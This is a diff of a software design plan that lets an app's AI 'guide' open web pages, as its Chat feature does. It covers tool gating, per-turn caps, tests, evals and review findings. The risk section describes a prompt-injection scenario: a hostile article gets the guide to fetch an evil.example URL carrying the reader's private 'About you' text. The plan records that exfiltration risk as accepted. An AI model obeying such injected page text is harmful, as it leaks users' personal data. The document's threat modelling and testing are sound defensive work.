@@ -1,7 +1,9 @@
 # Bring a web page into Chat, and whether the guide may open pages
 
-**Status:** stage 1 (1A) built on `dev`, 2026-10-17 (§ What landed). Stage 2 (2A) is planned here
-in full and asked of Greg as [q-g492eq](../user-feedback/questions/q-g492eq.md), not built.
+**Status:** stage 1 (1A) built on `dev`, 2026-10-17 (§ What landed). Stage 2 was planned as 2A
+and asked of Greg as [q-g492eq](../user-feedback/questions/q-g492eq.md); he chose B (reply
+`spya-cab6zp`, 2026-10-18), and § Stage 2 is now 2B, landed on `dev` 2026-10-18 under queue item
+`qi-qsy8nqyt` (§ What landed).
 **Why:** Greg's reply `spya-eqtvhz` (2026-10-17 13:08 UTC) to
 [q-madusw](../user-feedback/questions/q-madusw.md), about report `spya-vc6uzm`
 (`SPIDERYARN-READING2-HY`), queue item `qi-jbfehgss`:
@@ -127,76 +129,99 @@ is the mention path. Nothing of 1A exists on `origin/dev` as of `8052f3b78`.
 - One browser pass (Sonnet subagent, Playwright on the box) at 1440 and 390: a repeat, a fresh web
   page import to `done`, a pasted address, the cap, and the open article.
 
-## Stage 2 — 2A: the guide may open a page (planned, asked, not built)
+## Stage 2 — 2B: the guide may open a page, as Chat does
+
+**Greg chose B**, not the A this section first planned:
+
+> B
+>
+> — Greg, 2026-10-18 10:28 UTC, reply `spya-cab6zp` to [q-g492eq](../user-feedback/questions/q-g492eq.md)
+
+Option B as the question put it: *"Yes, but as Chat has it: the guide may open any address,
+including one it writes itself. Fewer refusals, but it gains the one way a hostile article could
+get your About you out."* So the allowlist of handed addresses planned here first (after Sol's F5)
+is dropped, and the risk it closed is recorded as accepted
+([security-risks.md § R29](../project/security-risks.md#r29)). The A design is in this file's
+history (`git log -p` on it) should the allowlist be wanted later, for the guide or for Chat, which
+[chat-tools.md § Still open](../project/chat-tools.md#still-open) still names as its fix.
 
 ### What changes
 
-- `READ_WEB_PAGE` joins `GUIDE_TYPED_TOOLS` in [`src/chat-tools.ts`](../../src/chat-tools.ts):
-  the typed guide only, not `GUIDE_TOOLS` (which Live is offered; Live is its own item).
-- **Every check Chat's `read_web_page` has, unchanged**: the URL caps (`MAX_URL_QUERY_CHARS` 256 on
-  the query and fragment, `MAX_URL_CHARS` 2,048 on the whole), the open article's own address
-  refused, `fetchDocument`'s scheme check, private-address guard, redirect limit and size cap, no
-  PDFs, 12,000 characters, the fence.
-- **New for the guide, and stricter than Chat — an allowlist of exact addresses** (after Sol F5).
-  The guide may open only an address it was handed, never one it composed:
-  - a link the current turn's `search_web` returned (the subagent already keeps only links the
-    search really returned);
-  - an address in one of the reader's own messages in this conversation;
-  - one of the open article's own links (`articleLinks`, the set chat-tools.md § Still open names
-    as the allowlist's first input).
-
-  Any other address is refused before a fetch, with a sentence telling the guide to offer
-  *Ask in Chat* instead. This closes the exfiltration channel for the guide outright: a hostile
-  article can no longer get data out by having the model write it into a URL's path or query,
-  because no composed URL is fetched. That is the allowlist Chat itself still lacks
-  ([chat-tools.md § Still open](../project/chat-tools.md#still-open)); the guide would get it first.
-- **One read a turn** (`READ_WEB_PAGE_PER_TURN_GUIDE = 1`, Sol F6), a second refused before any
-  fetch, as `search_web`'s third is. Raised to two only if the eval finds cases that need it.
-- **The prompt** (`GUIDE_SYSTEM`, reworded per [prompting-guide.md](../project/prompting-guide.md)),
-  carrying Greg's principle: the guide prefers to hand substantive work to Chat (its *Ask in Chat*
-  step); it may open a page when that answers a question about how to read this piece — is this
-  review fair to it, what does the author's other piece say about it — and a search result's
-  sentence is not enough. It never says it cannot open pages. It still answers inside its length
-  rule.
-- **Docs**: chat-tools.md (§ The eleven, § The guide, § Security), and security-map.md's
-  `src/chat-tools.ts` row names the guide's page-reading and its cap.
+- `read_web_page` joins `GUIDE_TYPED_TOOLS` in [`src/chat-tools.ts`](../../src/chat-tools.ts),
+  after `search_web`: the typed guide only, not `GUIDE_TOOLS` (which Live is offered; Live is its
+  own item). The definition is Chat's, picked out of `CHAT_TOOLS` by name as `GUIDE_TOOLS` is, so
+  it has one home.
+- **Every check Chat's `read_web_page` has, unchanged, and nothing more**: the same function
+  (`readWebPage`), so the URL caps (`MAX_URL_QUERY_CHARS` 256 on query and fragment, `MAX_URL_CHARS`
+  2,048 on the whole), the open article's own address refused, `fetchDocument`'s scheme check,
+  private-address guard, redirect limit and size cap, no PDFs, 12,000 characters, the fence. Any
+  address the model writes is fetched if those pass, as in Chat.
+- **One read a turn for the guide** (`READ_WEB_PAGE_PER_TURN_GUIDE = 1`, Sol F6). Kept: Greg's B
+  is about *which* address may be opened, and the brief that carried his reply says "one page per
+  answer as planned". A second is refused before any fetch, as `search_web`'s third is, counted per
+  `ToolContext` the same way (`searchesThisTurn`'s pattern). **Counted only when a read would
+  fetch**: the count is asked through `fetchDocument`'s `beforeFirstRequest`, after its URL, scheme,
+  DNS and address refusals and immediately before the first HTTP request, so an address refused for
+  what it is costs no read, and no HTTP request is sent by a refusal. Sol's F4 asked for `search_web`'s count-on-dispatch
+  instead; not taken, since a refused read sends nothing and spending the one read on it would
+  only cost the reader the page. Chat keeps its lack of a read-specific cap (its turn still has
+  the 120-second deadline and three tool rounds).
+- **Live's guide stays without it, and is gated so** (Sol F1, found in the build too): Live's
+  endpoint accepts any `CHAT_TOOLS` name and then asked `runTool`'s gate with `kind: "guide"`,
+  i.e. `toolsFor("guide")`, which now holds `read_web_page`. So `ToolContext` gains `spoken`, set
+  by that endpoint, and a spoken call is gated by `spokenToolsFor(kind)`, the same list
+  `liveTools` offers (one function, so offered and runnable cannot drift).
+- **`search_web`'s result tells the guide it can read one**, with no change: `canReadPages` is
+  already computed from `toolsOf(ctx.kind)`.
+- **The prompt** (`GUIDE_SYSTEM`'s YOUR TOOLS, reworded per
+  [prompting-guide.md](../project/prompting-guide.md)), carrying Greg's principle: substantive work
+  on the subject still goes to Chat (the *Ask in Chat* step); the guide may open one page a turn
+  when that answers a question about how to read this piece — a page the reader hands it (is this
+  review fair, is this worth reading alongside), or a search result whose sentence does not settle
+  it. "You cannot read a web page" and "Chat can do what you cannot: open a page" go. It still
+  answers inside its 60-word rule. It gains `WEB_LINKS`, the shared never-invent-a-URL rule every
+  other web-capable prompt carries (Sol F2), and the last-round nudge says "article and web tools"
+  (Sol F6).
+- **Docs**, in the same change: chat-tools.md (§ The eleven, § The guide, § Security,
+  § Still open), security-map.md's `src/chat-tools.ts` row (the guide's page-reading, its one read
+  a turn, and that its addresses are unrestricted, by Greg's choice), and
+  [security-risks.md](../project/security-risks.md) R29 with Greg's reply quoted.
 
 ### What it risks, said plainly
 
-- **Without the allowlist it would be a new outbound channel.** Today the guide's only outbound
-  text is a `search_web` query (two a turn, 300 characters). A GET is an outbound request: a
-  hostile article could tell the guide to read `https://evil.example/<the reader's About you>`,
-  up to 2,048 characters, path included, on top of its two searches. The guide holds the reader's
-  reason and *About you* every turn. Chat has that exposure today. The allowlist above is why 2A
-  does not give it to the guide: an address the search engine returned, the reader typed or the
-  article's author wrote cannot carry what the model read this turn.
-- **What remains**: a page the guide opens is a stranger's text, fenced, as in Chat; and the
-  search query itself is still a 300-character channel, unchanged by 2A.
+- **A new outbound channel for the guide, accepted.** A GET is an outbound request: a hostile
+  article could tell the guide to read `https://evil.example/<the reader's About you>`, up to
+  2,048 characters, path included (the 256 cap is on query and fragment only). The guide holds the
+  reader's reason and *About you* every turn. With one read and two searches a turn, that is three
+  model-issued calls a turn that can carry text out (one search may run several provider
+  searches, and a fetch may follow redirects), the read the widest (Sol F7). Chat has had this exposure since 2026-08-26
+  ([chat-tools.md § Security](../project/chat-tools.md#security-a-tool-result-is-data-and-one-of-them-is-a-strangers)).
+  Greg accepted it for the guide on 2026-10-18 (R29). What bounds it: one read a turn, the length
+  caps, `PROFILE_RULES` (prompt text, not a boundary), and the turn being the reader's own: a
+  hostile article must be one the reader opened and then talked to the guide about.
+- **A page the guide opens is a stranger's text**, fenced, as in Chat.
 - **Cost and latency** (Sol F6): a page adds up to 12,000 characters and up to 20 seconds, in a
   conversation whose answers are meant to be short. One read a turn bounds it; the eval measures it.
 - **Drift from its job.** Mitigated by the prompt and measured by the eval below.
 
 ### How it is checked
 
-- Tests: the guide's tool list includes it (typed) and Live's does not
-  (`tests/guide-tool-gate.test.ts`); a composed address (one not in the three sets) is refused
-  unfetched, including one that differs from an allowed link only in its query; a second read in a
-  turn is refused unfetched; the existing `read_web_page` tests run for a guide context; Chat's
-  behaviour is unchanged.
-- The guide eval ([`evals/guide/run.ts`](../../evals/guide/run.ts)), before and after: the
-  how-to-read targets that read a page, the content-question controls that should still hand off
-  to Chat with no read, answer length, and (Sol F6) how often it reads, the time to the answer,
-  tool rounds and input tokens per turn.
-- Sol on the plan and the code, as for every change.
-
-### The question to Greg
-
-A new file, `q-…`: may an unattended agent build 2A as planned here — Chat's checks, plus the
-allowlist of handed addresses and one read a turn — with Sol reviewing the plan and the code?
-Recommendation: yes. The question says plainly what the allowlist gives up: the guide cannot open
-a page it found any other way (a link inside a page it read, an address it guessed), and offers
-Chat for those instead. q-madusw is marked
-answered (`acted: spya-eqtvhz`), since the 2A follow-up is a different question.
+- Tests (red first where they assert new behaviour): the typed guide's tool list includes
+  `read_web_page` and Live's (`GUIDE_TOOLS`) does not (`tests/guide-tool-gate.test.ts`, whose
+  refused list loses it); a guide's read reaches the fetcher, including for an address that
+  appears nowhere in the conversation (B, said as a test so a later allowlist is a deliberate
+  change); a second read in one guide turn is refused unfetched while a new turn starts at zero;
+  Chat's reads stay uncapped; the open article's own address is refused for the guide as for Chat;
+  `search_web` tells the guide it can read one; the prompt no longer says it cannot open pages
+  (`tests/web-reach-every-kind.test.ts`).
+- The paid eval, [`evals/chat-web-reach.ts --kind guide`](../../evals/chat-web-reach.ts) (the
+  guide eval in `evals/guide/run.ts` runs with tools off, so it cannot see a read), before and
+  after, with one new target case, **given**: the reader hands the guide an address and asks
+  whether it is worth reading alongside the piece. Counted per case: reads, searches, seconds,
+  prose words, and whether the content-question control (`since`) still hands off to Chat with no
+  read. `evals/guide/run.ts` is re-run once after, to check the prompt change moved nothing it
+  scores.
+- Sol on the plan (read-only) and on the code (write-capable), as for every change.
 
 ## Stages
 
@@ -207,6 +232,10 @@ answered (`acted: spya-eqtvhz`), since the 2A follow-up is a different question.
 2. **Docs and bookkeeping**: chat-tools.md (§ Bringing in…, the guide principle in § The guide),
    web-client.md if it lists the new files, this plan's § What landed; the new question file;
    q-madusw answered; the report's note; `feedback-endings.ts`.
+3. **2B, after Greg's reply B** (2026-10-18, `qi-qsy8nqyt`): Sol on this plan's § Stage 2; the
+   eval's baseline; `src/chat-tools.ts` and the prompt with their tests; the eval after; the docs
+   (chat-tools.md, security-map.md, security-risks.md R29); Sol on the code; q-g492eq answered and
+   the report's note.
 
 ## Reviews
 
@@ -243,6 +272,34 @@ answered (`acted: spya-eqtvhz`), since the 2A follow-up is a different question.
   - One change after it: the source buttons' accessible name starts with the visible words
     (*Bring into this chat: Title*), so a voice command that says what is on the button finds it.
 
+- **Sol plan review of 2B** ([prompt](261017e-2b-plan-review-prompt.md),
+  [answer](261017e-2b-plan-review-sol.md)), read-only: *build with the P1 fixes*, no P0.
+  - F1, Live's endpoint would have run `read_web_page` for a guide session: taken (`spoken`,
+    `spokenToolsFor`, a route test); the build had found it too.
+  - F2, `WEB_LINKS` in the guide's prompt: taken.
+  - F3, the eval could not see cost per turn, which page was read, or the chat step: taken; it now
+    keeps reads (requested address, whether text was fetched, host, ms and outcome), the steps
+    offered, rounds, model-call count, input tokens and dollars per turn, and the
+    before run was repeated with the new eval on the unchanged code.
+  - F4, the test inventory (`guide-kind`, the live route) and stale comments: taken. Its ask that a
+    refused read spend the allowance: not taken (§ Stage 2, one read a turn).
+  - F5, the status claimed built before it was: corrected.
+  - F6, the last-round nudge: taken. F7, risk wording: taken.
+- **Sol code review of 2B** ([prompt](261017e-2b-code-review-prompt.md),
+  [diff](261017e-2b-code-review.diff), [answer](261017e-2b-code-review-sol.md)), write-capable:
+  *ship after the fixes made here*, no P0. Checked and kept:
+  - F1 (P1), an address `fetchDocument` refuses (a `file:` scheme, a private address, DNS) still
+    spent the guide's one read, because the count sat before the fetcher's own refusals: the count
+    moved to a `beforeFirstRequest` option on `fetchDocument`, asked once before the first HTTP
+    request (not again on retries or redirects), off by default so ingest is unchanged; tests in
+    `tests/fetch.test.ts` and `tests/chat-tools.test.ts`; postmortem
+    [261018c](../postmortems/261018c-entering-a-fetch-abstraction-is-not-dispatching-a-request.md);
+  - F2, the eval recorded a read's host, not its address, and counted refused reads as reads: it now
+    records the requested address and whether a page reached the model, plus rounds and calls;
+  - F3, stale wording in chat-tools.md, live-conversation.md, the prompt and the help page.
+  - It found no other path to `read_web_page` for a guide: typed turns reuse one context, Live
+    sets `spoken`, and nothing in `src/web/` assumes the guide cannot read.
+
 ## What landed
 
 - **Stage 1**: `0d10b7ea2` (the feature), `f3bd4ca26` (Sol's fixes). Files:
@@ -268,5 +325,14 @@ answered (`acted: spya-eqtvhz`), since the 2A follow-up is a different question.
   0.7 s, a site that refuses automated readers says so, Enter sends at once, and a second press
   adds nothing twice. Known and left: the button on a pasted address of the open article says so
   only once pressed (the box does not know the open article's address).
-- **Stage 2**: not built; asked as q-g492eq. Greg's principle is in
-  [chat-tools.md § The guide](../project/chat-tools.md#the-guide).
+- **Stage 2 (2B)**: landed on `dev` 2026-10-18 under `qi-qsy8nqyt`, after Greg's reply B
+  (`spya-cab6zp`) to q-g492eq. `READ_WEB_PAGE_TOOL` and `READ_WEB_PAGE_PER_TURN_GUIDE` in
+  [`src/chat-tools.ts`](../../src/chat-tools.ts), `ToolContext.spoken` and `spokenToolsFor` (Live's
+  offer and gate, [`src/live.ts`](../../src/live.ts), `liveTool` in `src/routes.ts`),
+  `beforeFirstRequest` in [`src/fetch.ts`](../../src/fetch.ts), `GUIDE_SYSTEM` in
+  [`src/converse.ts`](../../src/converse.ts); risk [R29](../project/security-risks.md#r29).
+  Tests red first for the guide's list, a composed address fetched, the one read a turn, the open
+  article, and the Live guide refused. Measured in
+  [261018d](../investigations/261018d-guide-reads-web-pages-measured.md): a page the reader hands
+  over read 6 of 6 times (0 before), no search result opened, the subject still sent to Chat, about
+  $0.025 and 5 s a read, a planted read tried 0 of 3 times, answers a few words longer.
